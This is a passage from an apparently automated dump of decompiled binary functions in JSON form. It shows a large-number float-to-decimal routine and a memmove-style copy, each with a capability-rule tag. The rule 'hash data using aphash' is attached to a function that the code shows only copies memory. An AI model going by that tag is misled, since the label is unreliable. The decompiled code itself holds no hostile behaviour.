ppcVar1 = &var_740h + puVar14;\n                                                    pcVar21 = *ppcVar1;\n                                                    *ppcVar1 = *ppcVar1 + pcVar10;\n                                                    puVar17 = (uVar12 * uVar18 >> 0x20) + CARRY4(uVar11, var_770h) +\n                                                              CARRY4(pcVar21, pcVar10);\n                                                    var_748h = var_748h + 1;\n                                                    puVar14 = puVar14 + 1;\n                                                    var_1d4h = var_744h;\n                                                    var_770h = puVar17;\n                                                } while (var_748h != puVar15);\n                                                do {\n                                                    if (puVar17 == NULL) break;\n                                                    if (puVar14 == 0x73) goto code_r0x004d9b8c;\n                                                    if (puVar14 == var_1d4h) {\n                                                        (&var_740h)[puVar14] = 0;\n                                                        var_744h = puVar14 + 1;\n                                                    }\n                                                    ppcVar1 = &var_740h + puVar14;\n                                                    pcVar21 = *ppcVar1;\n                                                    *ppcVar1 = *ppcVar1 + puVar17;\n                                                    puVar17 = CARRY4(pcVar21, puVar17);\n                                                    puVar14 = puVar14 + 1;\n                                                    var_1d4h = var_744h;\n                                                } while( true );\n                                            }\n                                            if (puVar14 == 0x73) goto code_r0x004d9b8c;\n                                        }\n                                        puVar20 = puVar20 + 1;\n                                    } while (puVar20 != var_754h);\n                                }\n                                puVar20 = var_1d4h << 2;\n                                puVar15 = &var_740h;\ncode_r0x004d9ac8:\n                                fcn.004da487(&var_1d0h, 0x1cc, puVar15, puVar20);\n                            }\n                            bVar4 = true;\n                        }\ncode_r0x004d9adb:\n                        if (!bVar4) goto code_r0x004d9bda;\n                    }\n                    if (var_77ch != NULL) {\n                        uVar12 = *(var_77ch * 4 + 0x5520cc);\n                        _var_75ch = _var_75ch & 0xffffffff | uVar12 << 0x20;\n                        if (uVar12 == 0) {\ncode_r0x004d9bda:\n                            var_1d4h = NULL;\n                            puVar15 = &var_1d0h;\n                            goto code_r0x004d9be7;\n                        }\n                        if ((uVar12 != 1) && (var_1d4h != NULL)) {\n                            var_74ch = NULL;\n                            puVar15 = NULL;\n                            do {\n                                uVar18 = (&var_1d0h)[puVar15];\n                                uVar11 = uVar12 * uVar18;\n                                (&var_1d0h)[puVar15] = uVar11 + var_74ch;\n                                var_74ch = (uVar12 * uVar18 >> 0x20) + CARRY4(uVar11, var_74ch);\n                                puVar15 = puVar15 + 1;\n                            } while (puVar15 != var_1d4h);\n                            if (var_74ch != NULL) {\n                                if (0x72 < var_1d4h) goto code_r0x004d9bda;\n                                (&var_1d0h)[var_1d4h] = var_74ch;\n                                var_1d4h = var_1d4h + 1;\n                            }\n                        }\n                    }\n                }\n                else {\n                    var_77ch = var_76ch % 10;\n                    for (var_74ch = var_76ch / 10; var_74ch != NULL; var_74ch = var_74ch - var_750h) {\n                        var_750h = var_74ch;\n                        if (0x26 < var_74ch) {\n                            var_750h = 0x26;\n                        }\n                        uVar12 = *(var_750h * 4 + 0x552016);\n                        uVar18 = *(var_750h * 4 + 0x552017);\n                        var_574h = uVar12 + uVar18;\n                        fcn.0040314d(&var_570h);\n                        fcn.0040576d(&var_570h + uVar12, *(var_750h * 4 + 0x552014) * 4 + 0x551540, uVar18 << 2);\n                        if (var_574h < 0x2) {\n                            if (var_570h == 0) {\n                                var_744h = NULL;\n                                var_3a4h = NULL;\n                                fcn.004da487(&var_3a0h, 0x1cc, &var_740h, 0);\n                            }\n                            else if ((var_570h != 1) && (var_3a4h != NULL)) {\n                                pcVar21 = NULL;\n                                _var_75ch = _var_75ch & 0xffffffff | ZEXT48(var_3a4h) << 0x20;\n                                puVar15 = NULL;\n                                do {\n                                    pcVar10 = apcStack928[puVar15 + -1];\n                                    uVar12 = var_570h * ZEXT48(pcVar10);\n                                    apcStack928[puVar15 + -1] = pcVar21 + uVar12;\n                                    pcVar21 = (var_570h * ZEXT48(pcVar10) >> 0x20) + CARRY4(uVar12, pcVar21);\n                                    puVar15 = puVar15 + 1;\n                                } while (puVar15 != var_3a4h);\n                                if (pcVar21 == NULL) goto code_r0x004d9304;\n                                if (var_3a4h < 0x73) {\n                                    apcStack928[var_3a4h + -1] = pcVar21;\n                                    var_3a4h = var_3a4h + 1;\n                                    goto code_r0x004d9304;\n                                }\n                                var_574h = NULL;\n                                var_3a4h = NULL;\n                                fcn.004da487(&var_3a0h, 0x1cc, &var_570h, 0);\n                                bVar4 = false;\n                                goto code_r0x004d9612;\n                            }\ncode_r0x004d9304:\n                            bVar4 = true;\n                        }\n                        else {\n                            if (var_3a4h < 0x2) {\n                                var_754h = var_3a0h;\n                                var_3a4h = var_574h;\n                                fcn.004da487(&var_3a0h, 0x1cc, &var_570h, var_574h << 2);\n                                if (var_754h == NULL) {\n                                    var_574h = var_754h;\n                                    var_3a4h = var_754h;\n                                    puVar15 = &var_570h;\n                                    puVar20 = var_754h;\n                                    goto code_r0x004d95ff;\n                                }\n                                if ((var_754h != 0x1) && (var_3a4h != NULL)) {\n                                    _var_75ch = _var_75ch & 0xffffffff | ZEXT48(var_3a4h) << 0x20;\n                                    pcVar21 = NULL;\n                                    puVar15 = NULL;\n                                    do {\n                                        pcVar10 = apcStack928[puVar15 + -1];\n                                        uVar12 = ZEXT48(var_754h) * ZEXT48(pcVar10);\n                                        apcStack928[puVar15 + -1] = pcVar21 + uVar12;\n                                        pcVar21 = (ZEXT48(var_754h) * ZEXT48(pcVar10) >> 0x20) + CARRY4(uVar12, pcVar21)\n                                        ;\n                                        puVar15 = puVar15 + 1;\n                                    } while (puVar15 != var_3a4h);\n                                    if (pcVar21 != NULL) {\n                                        if (0x72 < var_3a4h) {\n                                            var_574h = NULL;\n                                            puVar15 = &var_570h;\ncode_r0x004d9678:\n                                            var_3a4h = NULL;\n                                            fcn.004da487(&var_3a0h, 0x1cc, puVar15, 0);\n                                            bVar4 = false;\n                                            goto code_r0x004d9612;\n                                        }\n                                        apcStack928[var_3a4h + -1] = pcVar21;\n                                        var_3a4h = var_3a4h + 1;\n                                    }\n                                }\n                            }\n                            else {\n                                var_768h = &var_570h;\n                                if (var_3a4h <= var_574h) {\n                                    var_768h = &var_3a0h;\n                                }\n                                var_754h = &var_3a0h;\n                                puVar15 = var_3a4h;\n                                var_770h = var_574h;\n                                if (var_3a4h <= var_574h) {\n                                    var_754h = &var_570h;\n                                    puVar15 = var_574h;\n                                    var_770h = var_3a4h;\n                                }\n                                var_3a4h = NULL;\n                                puVar20 = NULL;\n                                var_744h = NULL;\n                                if (var_770h != NULL) {\n                                    do {\n                                        if (var_768h[puVar20] == 0) {\n                                            if (puVar20 == var_3a4h) {\n                                                (&var_740h)[puVar20] = 0;\n                                                var_3a4h = puVar20 + 1;\n                                                var_744h = var_3a4h;\n                                            }\n                                        }\n                                        else {\n                                            var_748h = NULL;\n                                            var_760h = NULL;\n                                            puVar14 = puVar20;\n                                            if (puVar15 != NULL) {\n                                                do {\n                                                    puVar16 = var_760h;\n                                                    if (puVar14 == 0x73) break;\n                                                    if (puVar14 == var_3a4h) {\n                                                        (&var_740h)[puVar14] = 0;\n                                                        var_744h = var_748h + 1 + puVar20;\n                                                    }\n                                                    uVar12 = var_754h[var_748h];\n                                                    uVar18 = var_768h[puVar20];\n                                                    uVar8 = uVar12 * uVar18;\n                                                    puVar9 = uVar8 + var_760h;\n                                                    puVar16 = &var_740h + puVar14;\n                                                    uVar11 = *puVar16;\n                                                    *puVar16 = puVar9 + *puVar16;\n                                                    puVar16 = (uVar12 * uVar18 >> 0x20) + CARRY4(uVar8, var_760h) +\n                                                              CARRY4(uVar11, puVar9);\n                                                    var_748h = var_748h + 1;\n                                                    puVar14 = puVar14 + 1;\n                                                    var_3a4h = var_744h;\n                                                    var_760h = puVar16;\n                                                } while (var_748h != puVar15);\n                                                do {\n                                                    if (puVar16 == NULL) break;\n                                                    if (puVar14 == 0x73) goto code_r0x004d965e;\n                                                    if (puVar14 == var_3a4h) {\n                                                        (&var_740h)[puVar14] = 0;\n                                                        var_744h = puVar14 + 1;\n                                                    }\n                                                    puVar19 = &var_740h + puVar14;\n                                                    uVar12 = *puVar19;\n                                                    *puVar19 = *puVar19 + puVar16;\n                                                    puVar16 = CARRY4(uVar12, puVar16);\n                                                    puVar14 = puVar14 + 1;\n                                                    var_3a4h = var_744h;\n                                                } while( true );\n                                            }\n                                            if (puVar14 == 0x73) {\ncode_r0x004d965e:\n                                                var_964h = NULL;\n                                                puVar15 = &var_960h;\n                                                goto code_r0x004d9678;\n                                            }\n                                        }\n                                        puVar20 = puVar20 + 1;\n                                    } while (puVar20 != var_770h);\n                                }\n                                puVar20 = var_3a4h << 2;\n                                puVar15 = &var_740h;\ncode_r0x004d95ff:\n                                fcn.004da487(&var_3a0h, 0x1cc, puVar15, puVar20);\n                            }\n                            bVar4 = true;\n                        }\ncode_r0x004d9612:\n                        if (!bVar4) goto code_r0x004d969d;\n                    }\n                    if (var_77ch != NULL) {\n                        uVar12 = *(var_77ch * 4 + 0x5520cc);\n                        _var_75ch = _var_75ch & 0xffffffff | uVar12 << 0x20;\n                        if (uVar12 == 0) {\ncode_r0x004d969d:\n                            var_3a4h = NULL;\n                            puVar15 = &var_3a0h;\ncode_r0x004d9be7:\n                            var_964h = NULL;\n                            fcn.004da487(puVar15, 0x1cc, &var_960h, 0);\n                        }\n                        else if ((uVar12 != 1) && (var_3a4h != NULL)) {\n                            var_74ch = NULL;\n                            puVar15 = NULL;\n                            do {\n                                pcVar21 = apcStack928[puVar15 + -1];\n                                uVar18 = uVar12 * ZEXT48(pcVar21);\n                                apcStack928[puVar15 + -1] = uVar18 + var_74ch;\n                                var_74ch = (uVar12 * ZEXT48(pcVar21) >> 0x20) + CARRY4(uVar18, var_74ch);\n                                puVar15 = puVar15 + 1;\n                            } while (puVar15 != var_3a4h);\n                            if (var_74ch != NULL) {\n                                if (0x72 < var_3a4h) goto code_r0x004d969d;\n                                apcStack928[var_3a4h + -1] = var_74ch;\n                                var_3a4h = var_3a4h + 1;\n                            }\n                        }\n                    }\n                }\n                puVar15 = var_764h;\n                var_748h = var_764h;\n                if (var_1d4h != NULL) {\n                    var_74ch = NULL;\n                    puVar20 = NULL;\n                    do {\n                        uVar12 = (&var_1d0h)[puVar20];\n                        uVar18 = uVar12 * 10;\n                        (&var_1d0h)[puVar20] = uVar18 + var_74ch;\n                        var_74ch = (uVar12 * 10 >> 0x20) + CARRY4(uVar18, var_74ch);\n                        puVar20 = puVar20 + 1;\n                    } while (puVar20 != var_1d4h);\n                    if (var_74ch != NULL) {\n                        if (var_1d4h < 0x73) {\n                            (&var_1d0h)[var_1d4h] = var_74ch;\n                            var_1d4h = var_1d4h + 1;\n                        }\n                        else {\n                            var_964h = NULL;\n                            var_1d4h = NULL;\n                            fcn.004da487(&var_1d0h, 0x1cc, &var_960h, 0);\n                        }\n                    }\n                }\n                iVar7 = fcn.00404755(&var_1d4h, &var_3a4h);\n                puVar20 = var_764h;\n                if (iVar7 == 10) {\n                    var_748h = var_764h + 1;\n                    var_76ch = var_76ch + 1;\n                    *var_764h = '1';\n                    uVar2 = _var_75ch & 0xffffffff;\n                    _var_75ch = uVar2 | ZEXT48(var_3a4h) << 0x20;\n                    if (var_3a4h != NULL) {\n                        pcVar21 = NULL;\n                        puVar15 = NULL;\n                        do {\n                            pcVar10 = apcStack928[puVar15 + -1];\n                            uVar12 = ZEXT48(pcVar10) * 10;\n                            apcStack928[puVar15 + -1] = pcVar21 + uVar12;\n                            pcVar21 = (ZEXT48(pcVar10) * 10 >> 0x20) + CARRY4(uVar12, pcVar21);\n                            puVar15 = puVar15 + 1;\n                        } while (puVar15 != var_3a4h);\n                        _var_75ch = uVar2 | ZEXT48(pcVar21) << 0x20;\n                        if (pcVar21 != NULL) {\n                            if (var_3a4h < 0x73) {\n                                apcStack928[var_3a4h + -1] = pcVar21;\n                                var_3a4h = var_3a4h + 1;\n                            }\n                            else {\n                                var_964h = NULL;\n                                var_3a4h = NULL;\n                                fcn.004da487(&var_3a0h, 0x1cc, &var_960h, 0);\n                            }\n                        }\n                    }\ncode_r0x004d9d28:\n                    puVar15 = puVar20 + 1;\n                    uVar12 = var_76ch;\n                }\n                else {\n                    if (iVar7 != 0) {\n                        var_748h = var_764h + 1;\n                        *var_764h = iVar7 + '0';\n                        goto code_r0x004d9d28;\n                    }\n                    uVar12 = var_76ch - 1;\n                }\n                var_784h[1] = uVar12;\n                uVar18 = var_778h;\n                if ((-1 < uVar12) && (var_778h < 0x80000000)) {\n                    uVar18 = var_778h + uVar12;\n                }\n                uVar12 = arg_1ch - 1U;\n                if (uVar18 <= arg_1ch - 1U) {\n                    uVar12 = uVar18;\n                }\n                var_74ch = uVar12 + var_764h;\n                if (puVar15 != var_74ch) {\n                    do {\n                        puVar20 = var_748h;\n                        if (var_1d4h == NULL) break;\n                        uVar12 = 0;\n                        puVar15 = NULL;\n                        do {\n                            uVar18 = (&var_1d0h)[puVar15];\n                            uVar11 = uVar18 * 1000000000;\n                            (&var_1d0h)[puVar15] = uVar11 + uVar12;\n                            uVar12 = (uVar18 * 1000000000 >> 0x20) + CARRY4(uVar11, uVar12);\n                            puVar15 = puVar15 + 1;\n                        } while (puVar15 != var_1d4h);\n                        if (uVar12 != 0) {\n                            if (var_1d4h < 0x73) {\n                                (&var_1d0h)[var_1d4h] = uVar12;\n                                var_1d4h = var_1d4h + 1;\n                            }\n                            else {\n                                var_964h = NULL;\n                                var_1d4h = NULL;\n                                fcn.004da487(&var_1d0h, 0x1cc, &var_960h, 0);\n                            }\n                        }\n                        var_77ch = fcn.00404755(&var_1d4h, &var_3a4h);\n                        bVar22 = var_1d4h == NULL;\n                        var_778h = 8;\n                        uVar12 = var_74ch - puVar20;\n                        do {\n                            uVar2 = ZEXT48(var_77ch);\n                            var_77ch = var_77ch / var_774h;\n                            _var_75ch = _var_75ch & 0xffffffff | uVar2 % ZEXT48(var_774h) << 0x20;\n                            cVar5 = uVar2 % ZEXT48(var_774h) + '0';\n                            if (uVar12 < var_778h) {\n                                bVar22 = bVar22 & cVar5 == '0';\n                            }\n                            else {\n                                *(var_778h + puVar20) = cVar5;\n                            }\n                            var_778h = var_778h - 1;\n                        } while (var_778h != 0xffffffff);\n                        if (9 < uVar12) {\n                            uVar12 = 9;\n                        }\n                        puVar15 = puVar20 + uVar12;\n                        var_748h = puVar15;\n                    } while (puVar15 != var_74ch);\n                }\n                *puVar15 = '\\0';\n                _var_75ch = CONCAT14(bVar22, var_75ch);\n                goto code_r0x004d9f12;\n            }\n            pcVar21 = \"1#IND\";\n        }\ncode_r0x004d8b17:\n        iVar7 = fcn.00405f56(var_764h, arg_1ch, pcVar21);\n    }\n    if (iVar7 != 0) {\n        fcn.004035f8(0, 0, 0, 0, 0);\n        pcVar3 = swi(3);\n        (*pcVar3)();\n        return;\n    }\ncode_r0x004d9f12:\n    if (var_788h != '\\0') {\n        fcn.00404453(&var_790h);\n    }\n    fcn.00403085(var_964h);\n    return;\n}\n",
        "token_count": 10922
    },
    "0040576d": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nuint64_t fcn.0040576d(ulong *param_1, ulong *param_2, uint32_t param_3)\n\n{\n    ulong uVar1;\n    uchar auVar2 [32];\n    uchar auVar3 [32];\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint uVar13;\n    uint uVar14;\n    uint uVar15;\n    uint uVar16;\n    uint uVar17;\n    uint uVar18;\n    uint uVar19;\n    uint uVar20;\n    uint uVar21;\n    uint uVar22;\n    uint uVar23;\n    uint uVar24;\n    uint uVar25;\n    uint uVar26;\n    uint uVar27;\n    uint uVar28;\n    uint uVar29;\n    uint uVar30;\n    uint uVar31;\n    int32_t iVar32;\n    uint32_t uVar33;\n    uint32_t uVar34;\n    int32_t iVar35;\n    ulong *puVar36;\n    uint *puVar37;\n    uint *puVar38;\n    ulong *puVar39;\n    uint *puVar40;\n    uint *puVar41;\n    uint uVar42;\n    uint uVar43;\n    uint uVar44;\n    uint64_t uVar45;\n    \n    if ((param_2 < param_1) && (param_1 < param_3 + param_2)) {\n        puVar37 = param_2 + param_3;\n        puVar40 = param_1 + param_3;\n        uVar33 = param_3;\n        if (0x1f < param_3) {\n            if ((*0x56cc9c >> 1 & 1) == 0) {\n                if ((puVar40 & 3) != 0) {\n                    uVar33 = puVar40 & 3;\n                    param_3 = param_3 - uVar33;\n                    do {\n                        *(puVar40 - 1) = *(puVar37 + -1);\n                        puVar37 = puVar37 + -1;\n                        puVar40 = puVar40 - 1;\n                        uVar33 = uVar33 - 1;\n                    } while (uVar33 != 0);\n                }\n                if (0x1f < param_3) {\n                    uVar33 = param_3 >> 2;\n                    while( true ) {\n                        if (uVar33 == 0) break;\n                        uVar33 = uVar33 - 1;\n                        puVar40[-1] = puVar37[-1];\n                        puVar37 = puVar37 + -1;\n                        puVar40 = puVar40 + -1;\n                    }\n    // switch table (4 cases) at 0x483b30\n                    switch(param_3 & 3) {\n                    case 0:\n                        return CONCAT44(param_3, param_1) & 0x3ffffffff;\n                    case 1:\n                        *(puVar40 - 1) = *(puVar37 + -1);\n                        return CONCAT44(param_3, param_1) & 0x3ffffffff;\n                    case 2:\n                        *(puVar40 - 1) = *(puVar37 + -1);\n                        *(puVar40 - 2) = *(puVar37 + -2);\n                        return CONCAT44(param_3, param_1) & 0x3ffffffff;\n                    case 3:\n                        *(puVar40 - 1) = *(puVar37 + -1);\n                        *(puVar40 - 2) = *(puVar37 + -2);\n                        *(puVar40 - 3) = *(puVar37 + -3);\n                        return CONCAT44(param_3, param_1) & 0x3ffffffff;\n                    }\n                }\n            }\n            else {\n                while (puVar38 = puVar37,  puVar41 = puVar40,  (puVar40 & 0xf) != 0) {\n                    puVar37 = puVar37 + -1;\n                    puVar40 = puVar40 + -1;\n                    *puVar40 = *puVar37;\n                    param_3 = param_3 - 1;\n                }\n                do {\n                    puVar37 = puVar38;\n                    puVar40 = puVar41;\n                    if (param_3 < 0x80) break;\n                    puVar37 = puVar38 + -0x20;\n                    puVar40 = puVar41 + -0x20;\n                    uVar42 = puVar38[-0x1f];\n                    uVar43 = puVar38[-0x1e];\n                    uVar44 = puVar38[-0x1d];\n                    uVar4 = puVar38[-0x1c];\n                    uVar5 = puVar38[-0x1b];\n                    uVar6 = puVar38[-0x1a];\n                    uVar7 = puVar38[-0x19];\n                    uVar8 = puVar38[-0x18];\n                    uVar9 = puVar38[-0x17];\n                    uVar10 = puVar38[-0x16];\n                    uVar11 = puVar38[-0x15];\n                    uVar12 = puVar38[-0x14];\n                    uVar13 = puVar38[-0x13];\n                    uVar14 = puVar38[-0x12];\n                    uVar15 = puVar38[-0x11];\n                    uVar16 = puVar38[-0x10];\n                    uVar17 = puVar38[-0xf];\n                    uVar18 = puVar38[-0xe];\n                    uVar19 = puVar38[-0xd];\n                    uVar20 = puVar38[-0xc];\n                    uVar21 = puVar38[-0xb];\n                    uVar22 = puVar38[-10];\n                    uVar23 = puVar38[-9];\n                    uVar24 = puVar38[-8];\n                    uVar25 = puVar38[-7];\n                    uVar26 = puVar38[-6];\n                    uVar27 = puVar38[-5];\n                    uVar28 = puVar38[-4];\n                    uVar29 = puVar38[-3];\n                    uVar30 = puVar38[-2];\n                    uVar31 = puVar38[-1];\n                    *puVar40 = *puVar37;\n                    puVar41[-0x1f] = uVar42;\n                    puVar41[-0x1e] = uVar43;\n                    puVar41[-0x1d] = uVar44;\n                    puVar41[-0x1c] = uVar4;\n                    puVar41[-0x1b] = uVar5;\n                    puVar41[-0x1a] = uVar6;\n                    puVar41[-0x19] = uVar7;\n                    puVar41[-0x18] = uVar8;\n                    puVar41[-0x17] = uVar9;\n                    puVar41[-0x16] = uVar10;\n                    puVar41[-0x15] = uVar11;\n                    puVar41[-0x14] = uVar12;\n                    puVar41[-0x13] = uVar13;\n                    puVar41[-0x12] = uVar14;\n                    puVar41[-0x11] = uVar15;\n                    puVar41[-0x10] = uVar16;\n                    puVar41[-0xf] = uVar17;\n                    puVar41[-0xe] = uVar18;\n                    puVar41[-0xd] = uVar19;\n                    puVar41[-0xc] = uVar20;\n                    puVar41[-0xb] = uVar21;\n                    puVar41[-10] = uVar22;\n                    puVar41[-9] = uVar23;\n                    puVar41[-8] = uVar24;\n                    puVar41[-7] = uVar25;\n                    puVar41[-6] = uVar26;\n                    puVar41[-5] = uVar27;\n                    puVar41[-4] = uVar28;\n                    puVar41[-3] = uVar29;\n                    puVar41[-2] = uVar30;\n                    puVar41[-1] = uVar31;\n                    param_3 = param_3 - 0x80;\n                    puVar38 = puVar37;\n                    puVar41 = puVar40;\n                } while ((param_3 & 0xffffff80) != 0);\n                puVar38 = puVar37;\n                puVar41 = puVar40;\n                if (0x1f < param_3) {\n                    do {\n                        puVar37 = puVar38 + -8;\n                        puVar40 = puVar41 + -8;\n                        uVar42 = puVar38[-7];\n                        uVar43 = puVar38[-6];\n                        uVar44 = puVar38[-5];\n                        uVar4 = puVar38[-4];\n                        uVar5 = puVar38[-3];\n                        uVar6 = puVar38[-2];\n                        uVar7 = puVar38[-1];\n                        *puVar40 = *puVar37;\n                        puVar41[-7] = uVar42;\n                        puVar41[-6] = uVar43;\n                        puVar41[-5] = uVar44;\n                        puVar41[-4] = uVar4;\n                        puVar41[-3] = uVar5;\n                        puVar41[-2] = uVar6;\n                        puVar41[-1] = uVar7;\n                        param_3 = param_3 - 0x20;\n                        puVar38 = puVar37;\n                        puVar41 = puVar40;\n                    } while ((param_3 & 0xffffffe0) != 0);\n                }\n            }\n        }\n        for (; (param_3 & 0xfffffffc) != 0; param_3 = param_3 - 4) {\n            puVar40 = puVar40 + -1;\n            puVar37 = puVar37 + -1;\n            *puVar40 = *puVar37;\n        }\n        for (; param_3 != 0; param_3 = param_3 - 1) {\n            puVar40 = puVar40 - 1;\n            puVar37 = puVar37 + -1;\n            *puVar40 = *puVar37;\n        }\n        return CONCAT44(uVar33, param_1);\n    }\n    uVar33 = param_3;\n    puVar39 = param_1;\n    if (0x1f < param_3) {\n        if (param_3 < 0x80) {\n            if ((*0x56cc9c >> 1 & 1) != 0) {\ncode_r0x00483ced:\n                if (uVar33 == 0) goto code_r0x00483d50;\n                for (param_3 = uVar33 >> 5; param_3 != 0; param_3 = param_3 - 1) {\n                    uVar42 = *(param_2 + 4);\n                    uVar43 = *(param_2 + 1);\n                    uVar44 = *(param_2 + 0xc);\n                    uVar4 = *(param_2 + 2);\n                    uVar5 = *(param_2 + 0x14);\n                    uVar6 = *(param_2 + 3);\n                    uVar7 = *(param_2 + 0x1c);\n                    *puVar39 = *param_2;\n                    *(puVar39 + 4) = uVar42;\n                    *(puVar39 + 1) = uVar43;\n                    *(puVar39 + 0xc) = uVar44;\n                    *(puVar39 + 2) = uVar4;\n                    *(puVar39 + 0x14) = uVar5;\n                    *(puVar39 + 3) = uVar6;\n                    *(puVar39 + 0x1c) = uVar7;\n                    param_2 = param_2 + 4;\n                    puVar39 = puVar39 + 4;\n                }\n                goto code_r0x00483d1b;\n            }\ncode_r0x00483a47:\n            uVar33 = param_1 & 3;\n            while (uVar33 != 0) {\n                *puVar39 = *param_2;\n                param_3 = param_3 - 1;\n                param_2 = param_2 + 1;\n                puVar39 = puVar39 + 1;\n                uVar33 = puVar39 & 3;\n            }\n        }\n        else {\n            if ((*0x56ec50 >> 1 & 1) != 0) {\n                for (; uVar33 != 0; uVar33 = uVar33 - 1) {\n                    *puVar39 = *param_2;\n                    param_2 = param_2 + 1;\n                    puVar39 = puVar39 + 1;\n                }\n                return CONCAT44(param_3, param_1);\n            }\n            if ((((param_1 ^ param_2) & 0xf) == 0) && ((*0x56cc9c >> 1 & 1) != 0)) {\n                if ((param_2 & 0xf) != 0) {\n                    uVar34 = 0x10 - (param_2 & 0xf);\n                    param_3 = param_3 - uVar34;\n                    for (uVar33 = uVar34 & 3; uVar33 != 0; uVar33 = uVar33 - 1) {\n                        *puVar39 = *param_2;\n                        param_2 = param_2 + 1;\n                        puVar39 = puVar39 + 1;\n                    }\n                    for (uVar34 = uVar34 >> 2; uVar34 != 0; uVar34 = uVar34 - 1) {\n                        *puVar39 = *param_2;\n                        param_2 = param_2 + 4;\n                        puVar39 = puVar39 + 4;\n                    }\n                }\n                uVar33 = param_3 & 0x7f;\n                for (param_3 = param_3 >> 7; param_3 != 0; param_3 = param_3 - 1) {\n                    uVar42 = *(param_2 + 4);\n                    uVar43 = *(param_2 + 1);\n                    uVar44 = *(param_2 + 0xc);\n                    uVar4 = *(param_2 + 2);\n                    uVar5 = *(param_2 + 0x14);\n                    uVar6 = *(param_2 + 3);\n                    uVar7 = *(param_2 + 0x1c);\n                    uVar8 = *(param_2 + 4);\n                    uVar9 = *(param_2 + 0x24);\n                    uVar10 = *(param_2 + 5);\n                    uVar11 = *(param_2 + 0x2c);\n                    uVar12 = *(param_2 + 6);\n                    uVar13 = *(param_2 + 0x34);\n                    uVar14 = *(param_2 + 7);\n                    uVar15 = *(param_2 + 0x3c);\n                    *puVar39 = *param_2;\n                    *(puVar39 + 4) = uVar42;\n                    *(puVar39 + 1) = uVar43;\n                    *(puVar39 + 0xc) = uVar44;\n                    *(puVar39 + 2) = uVar4;\n                    *(puVar39 + 0x14) = uVar5;\n                    *(puVar39 + 3) = uVar6;\n                    *(puVar39 + 0x1c) = uVar7;\n                    *(puVar39 + 4) = uVar8;\n                    *(puVar39 + 0x24) = uVar9;\n                    *(puVar39 + 5) = uVar10;\n                    *(puVar39 + 0x2c) = uVar11;\n                    *(puVar39 + 6) = uVar12;\n                    *(puVar39 + 0x34) = uVar13;\n                    *(puVar39 + 7) = uVar14;\n                    *(puVar39 + 0x3c) = uVar15;\n                    uVar42 = *(param_2 + 0x44);\n                    uVar43 = *(param_2 + 9);\n                    uVar44 = *(param_2 + 0x4c);\n                    uVar4 = *(param_2 + 10);\n                    uVar5 = *(param_2 + 0x54);\n                    uVar6 = *(param_2 + 0xb);\n                    uVar7 = *(param_2 + 0x5c);\n                    uVar8 = *(param_2 + 0xc);\n                    uVar9 = *(param_2 + 100);\n                    uVar10 = *(param_2 + 0xd);\n                    uVar11 = *(param_2 + 0x6c);\n                    uVar12 = *(param_2 + 0xe);\n                    uVar13 = *(param_2 + 0x74);\n                    uVar14 = *(param_2 + 0xf);\n                    uVar15 = *(param_2 + 0x7c);\n                    *(puVar39 + 8) = *(param_2 + 8);\n                    *(puVar39 + 0x44) = uVar42;\n                    *(puVar39 + 9) = uVar43;\n                    *(puVar39 + 0x4c) = uVar44;\n                    *(puVar39 + 10) = uVar4;\n                    *(puVar39 + 0x54) = uVar5;\n                    *(puVar39 + 0xb) = uVar6;\n                    *(puVar39 + 0x5c) = uVar7;\n                    *(puVar39 + 0xc) = uVar8;\n                    *(puVar39 + 100) = uVar9;\n                    *(puVar39 + 0xd) = uVar10;\n                    *(puVar39 + 0x6c) = uVar11;\n                    *(puVar39 + 0xe) = uVar12;\n                    *(puVar39 + 0x74) = uVar13;\n                    *(puVar39 + 0xf) = uVar14;\n                    *(puVar39 + 0x7c) = uVar15;\n                    param_2 = param_2 + 0x10;\n                    puVar39 = puVar39 + 0x10;\n                }\n                goto code_r0x00483ced;\n            }\n            if (((*0x56ec50 & 1) == 0) || ((param_1 & 3) != 0)) goto code_r0x00483a47;\n            if ((param_2 & 3) == 0) {\n                if ((param_1 >> 2 & 1) != 0) {\n                    uVar42 = *param_2;\n                    param_3 = param_3 - 4;\n                    param_2 = param_2 + 4;\n                    *param_1 = uVar42;\n                    param_1 = param_1 + 4;\n                }\n                if ((param_1 >> 3 & 1) != 0) {\n                    uVar1 = *param_2;\n                    param_3 = param_3 - 8;\n                    param_2 = param_2 + 1;\n                    *param_1 = uVar1;\n                    param_1 = param_1 + 1;\n                }\n                if ((param_2 & 7) == 0) {\n                    puVar39 = param_2 + -1;\n                    uVar42 = *param_2;\n                    uVar43 = *(param_2 + 4);\n                    do {\n                        puVar36 = puVar39;\n                        uVar5 = *(puVar36 + 4);\n                        uVar6 = *(puVar36 + 0x24);\n                        param_3 = param_3 - 0x30;\n                        auVar2 = *(puVar36 + 2);\n                        uVar44 = *(puVar36 + 7);\n                        uVar4 = *(puVar36 + 0x3c);\n                        auVar3 = *(puVar36 + 4);\n                        *(param_1 + 1) = uVar42;\n                        *(param_1 + 0xc) = uVar43;\n                        *(param_1 + 2) = uVar5;\n                        *(param_1 + 0x14) = uVar6;\n                        *(param_1 + 2) = SUB3216(auVar2 >> 0x40, 0);\n                        *(param_1 + 4) = SUB3216(auVar3 >> 0x40, 0);\n                        param_1 = param_1 + 6;\n                        puVar39 = puVar36 + 6;\n                        uVar42 = uVar44;\n                        uVar43 = uVar4;\n                    } while (0x2f < param_3);\n                    puVar36 = puVar36 + 7;\n                }\n                else if ((param_2 >> 3 & 1) == 0) {\n                    iVar32 = param_2 + -4;\n                    uVar42 = *param_2;\n                    uVar43 = *(param_2 + 4);\n                    uVar44 = *(param_2 + 1);\n                    do {\n                        iVar35 = iVar32;\n                        uVar7 = *(iVar35 + 0x20);\n                        param_3 = param_3 - 0x30;\n                        auVar2 = *(iVar35 + 0x10);\n                        uVar4 = *(iVar35 + 0x34);\n                        uVar5 = *(iVar35 + 0x38);\n                        uVar6 = *(iVar35 + 0x3c);\n                        auVar3 = *(iVar35 + 0x20);\n                        *(param_1 + 4) = uVar42;\n                        *(param_1 + 1) = uVar43;\n                        *(param_1 + 0xc) = uVar44;\n                        *(param_1 + 2) = uVar7;\n                        *(param_1 + 2) = SUB3216(auVar2 >> 0x20, 0);\n                        *(param_1 + 4) = SUB3216(auVar3 >> 0x20, 0);\n                        param_1 = param_1 + 6;\n                        iVar32 = iVar35 + 0x30;\n                        uVar42 = uVar4;\n                        uVar43 = uVar5;\n                        uVar44 = 